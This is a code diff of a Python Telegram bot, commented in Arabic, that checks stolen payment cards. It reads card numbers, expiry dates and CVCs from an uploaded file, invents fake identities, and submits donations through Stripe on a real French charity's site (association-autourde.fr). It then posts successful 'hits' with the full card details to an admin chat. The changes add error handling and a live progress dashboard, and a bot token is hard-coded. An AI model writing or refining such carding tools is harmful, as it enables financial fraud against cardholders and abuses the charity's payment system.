@@ -1,11 +1,12 @@
 import os
 import random
 import re
+import time
 import requests
 import telebot
 from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup
 
-# --- إعدادات البوت الأساسية (تم دمج التوكن والآيدي الخاص بك) ---
+# --- إعدادات البوت الأساسية ---
 TOKEN = "8936672369:AAFJ-mEEThFA7D3D_8TOzjZ3lQ0SOlIA1CI"
 ADMIN_CHAT_ID = "7352706784"
 
@@ -59,7 +60,8 @@ def gdata():
   return mail, name, add, city, zip, phone
 
 
-def check_card_and_notify(cc, month, year, cvc):
+def check_card_detailed(cc, month, year, cvc):
+  # توليد وتخزين البيانات الوهمية الخاصة بهذا الفحص فقط
   mail, name, add, city, zip, phone = gdata()
   r = requests.Session()
   u = generate_user_agent()
@@ -76,6 +78,7 @@ def check_card_and_notify(cc, month, year, cvc):
         "https://www.association-autourde.fr/faire-un-don/",
         cookies=r.cookies,
         headers=headers_nonce,
+        timeout=10,
     )
     m = re.search(
         r'name="_fluentform_\d+_fluentformnonce"\s+value="([^"]+)"',
@@ -83,9 +86,9 @@ def check_card_and_notify(cc, month, year, cvc):
     )
     x = m.group(1) if m else None
     if not x:
-      return
-  except Exception:
-    return
+      return "Error: Nonce Not Found", None
+  except Exception as e:
+    return f"Connection Error: {type(e).__name__}", None
 
   headers_stripe = {
       "authority": "api.stripe.com",
@@ -105,13 +108,19 @@ def check_card_and_notify(cc, month, year, cvc):
         "https://api.stripe.com/v1/payment_methods",
         headers=headers_stripe,
         data=stripe_data,
+        timeout=10,
     )
     res_json = response_stripe.json()
+    if "error" in res_json:
+      return (
+          f"Decline: {res_json['error'].get('message', 'Unknown Stripe Error')}",
+          None,
+      )
     if "id" not in res_json:
-      return
+      return "Decline: Invalid Payment Method", None
     pm_id = res_json["id"]
-  except Exception:
-    return
+  except Exception as e:
+    return f"Stripe Error: {type(e).__name__}", None
 
   headers_submit = {
       "authority": "www.association-autourde.fr",
@@ -140,35 +149,31 @@ def check_card_and_notify(cc, month, year, cvc):
         cookies=r.cookies,
         headers=headers_submit,
         data=submit_data,
+        timeout=15,
     )
     result = response_final.json()
     result_str = str(result)
+
+    # تجميع بيانات التفاصيل لإرجاعها مع النتيجة
+    details = {
+        "mail": mail,
+        "name": name,
+        "add": add,
+        "city": city,
+        "zip": zip,
+        "phone": phone,
+    }
 
     if (
         "success" in result_str
         or "true" in result_str.lower()
         or "thank" in result_str.lower()
     ):
-      hit_msg = f"""
-╔══════════════════════════════════╗
-║        Stripe Hit - Success 🔥       ║
-╚══════════════════════════════════╝
- ⟡ Card: {cc}|{month}|{year}|{cvc}
- ⟡ Status: Charge 🔥
- ⟡ Response: Payment succeeded
- ──────────────────────────────────
- 👤 Fake Info Details:
- ⟡ Name: {name}
- ⟡ Email: {mail}
- ⟡ Phone: {phone}
- ⟡ City: {city} | Zip: {zip}
- ⟡ Address: {add}
- ──────────────────────────────────
- ⟡ Site: association-autourde.fr
-------------------------------------"""
-      bot.send_message(ADMIN_CHAT_ID, hit_msg)
-  except Exception:
-    pass
+      return "Success: Payment succeeded", details
+    else:
+      return f"Decline: {result_str[:60]}", None
+  except Exception as e:
+    return f"Submit Error: {type(e).__name__}", None
 
 
 # --- لوحة التحكم التفاعلية ---
@@ -177,8 +182,12 @@ def send_welcome(message):
   markup = InlineKeyboardMarkup()
   markup.row_width = 1
   markup.add(
-      InlineKeyboardButton("📁 فحص عن طريق ملف (Cards.txt)", callback_data="upload_guide"),
-      InlineKeyboardButton("⚙️ نوع الفحص (Stripe Graphl v3)", callback_data="gateway_info"),
+      InlineKeyboardButton(
+          "📁 فحص عن طريق ملف (Cards.txt)", callback_data="upload_guide"
+      ),
+      InlineKeyboardButton(
+          "⚙️ نوع الفحص (Stripe Graphl v3)", callback_data="gateway_info"
+      ),
       InlineKeyboardButton("📊 حالة السيرفر", callback_data="server_status"),
   )
 
@@ -195,7 +204,7 @@ def callback_query(call):
     bot.answer_callback_query(call.id)
     bot.send_message(
         call.message.chat.id,
-        "📂 لإجراء الفحص، قم **بإرسال ملف البطاقات (cards.txt)** مباشرة هنا في المحادثة وسأبدأ المعالجة تلقائياً.",
+        "📂 لإجراء الفحص، قم **بإرسال ملف البطاقات (cards.txt)** مباشرة هنا في المحادثة وسأبدأ المعالجة مع لوحة المتابعة الحية.",
     )
   elif call.data == "gateway_info":
     bot.answer_callback_query(call.id)
@@ -211,7 +220,7 @@ def callback_query(call):
     )
 
 
-# --- استقبال ملف البطاقات وفحصها ---
+# --- استقبال ملف البطاقات ومعالجتها بلوحة حية ---
 @bot.message_handler(content_types=["document"])
 def handle_docs(message):
   try:
@@ -222,27 +231,118 @@ def handle_docs(message):
     with open(local_path, "wb") as new_file:
       new_file.write(downloaded_file)
 
-    bot.reply_to(
-        message,
-        "📁 تم استلام الملف بنجاح! جاري بدء عملية الفحص وإرسال النتائج الناجحة هنا...",
+    with open(local_path, "r", encoding="utf-8") as f:
+      cards = [line.strip() for line in f.readlines() if line.strip()]
+
+    total_cards = len(cards)
+    if total_cards == 0:
+      bot.reply_to(message, "⚠️ الملف فارغ أو لا يحتوي على بطاقات صحيحة.")
+      return
+
+    # إنشاء رسالة لوحة الفحص الحية المبدئية
+    status_msg = bot.send_message(
+        ADMIN_CHAT_ID,
+        f"""
+╔══════════════════════════════════╗
+║     ⚡ Live Checker Dashboard      ║
+╚══════════════════════════════════╝
+ 📊 Status: Running...
+ 📁 Total Cards: {total_cards}
+ 🔄 Checked: 0 / {total_cards}
+ 🔥 Hits: 0
+ ❌ Declined: 0
+ ──────────────────────────────────
+ ⏳ Current: Initializing...
+------------------------------------""",
     )
 
-    with open(local_path, "r", encoding="utf-8") as f:
-      cards = f.readlines()
+    checked = 0
+    hits = 0
+    declines = 0
 
     for line in cards:
-      line = line.strip()
-      if not line:
-        continue
+      checked += 1
       try:
-        cc, month, year, cvc = line.split("|")
+        parts = line.split("|")
+        if len(parts) < 4:
+          declines += 1
+          continue
+        cc, month, year, cvc = parts[0], parts[1], parts[2], parts[3]
         if len(year) == 2:
           year = "20" + year
-        check_card_and_notify(cc, month, year, cvc)
-      except ValueError:
-        continue
 
-    bot.send_message(ADMIN_CHAT_ID, "✅ انتهت عملية فحص جميع البطاقات في الملف بنجاح.")
+        # تحديث اللوحة الحية بالبطاقة الحالية
+        try:
+          bot.edit_message_text(
+              chat_id=ADMIN_CHAT_ID,
+              message_id=status_msg.message_id,
+              text=f"""
+╔══════════════════════════════════╗
+║     ⚡ Live Checker Dashboard      ║
+╚══════════════════════════════════╝
+ 📊 Status: Scanning 🔍
+ 📁 Total Cards: {total_cards}
+ 🔄 Checked: {checked} / {total_cards}
+ 🔥 Hits: {hits}
+ ❌ Declined: {declines}
+ ──────────────────────────────────
+ ⏳ Checking: {cc[:6]}******|{month}|{year}
+------------------------------------""",
+          )
+        except Exception:
+          pass
+
+        # فحص البطاقة عبر الموقع والبوابة والحصول على النتيجة والبيانات المستخدمة
+        res, details = check_card_detailed(cc, month, year, cvc)
+
+        if "Success" in res and details:
+          hits += 1
+          hit_msg = f"""
+╔══════════════════════════════════╗
+║        Stripe Hit - Success 🔥       ║
+╚══════════════════════════════════╝
+ ⟡ Card: {cc}|{month}|{year}|{cvc}
+ ⟡ Status: Charge 🔥
+ ⟡ Response: {res}
+ ──────────────────────────────────
+ 👤 Fake Info Details (Used):
+ ⟡ Name: {details['name']}
+ ⟡ Email: {details['mail']}
+ ⟡ Phone: {details['phone']}
+ ⟡ City: {details['city']} | Zip: {details['zip']}
+ ⟡ Address: {details['add']}
+ ──────────────────────────────────
+ ⟡ Site: association-autourde.fr
+------------------------------------"""
+          bot.send_message(ADMIN_CHAT_ID, hit_msg)
+        else:
+          declines += 1
+
+      except Exception:
+        declines += 1
+
+      time.sleep(1)
+
+    # التحديث النهائي عند اكتمال فحص جميع البطاقات في الملف
+    try:
+      bot.edit_message_text(
+          chat_id=ADMIN_CHAT_ID,
+          message_id=status_msg.message_id,
+          text=f"""
+╔══════════════════════════════════╗
+║     ⚡ Live Checker Dashboard      ║
+╚══════════════════════════════════╝
+ 📊 Status: Completed ✅
+ 📁 Total Cards: {total_cards}
+ 🔄 Checked: {checked} / {total_cards}
+ 🔥 Hits: {hits}
+ ❌ Declined: {declines}
+ ──────────────────────────────────
+ 🎯 All cards processed successfully!
+------------------------------------""",
+      )
+    except Exception:
+      pass
 
   except Exception as e:
     bot.reply_to(message, f"حدث خطأ أثناء معالجة الملف: {e}")
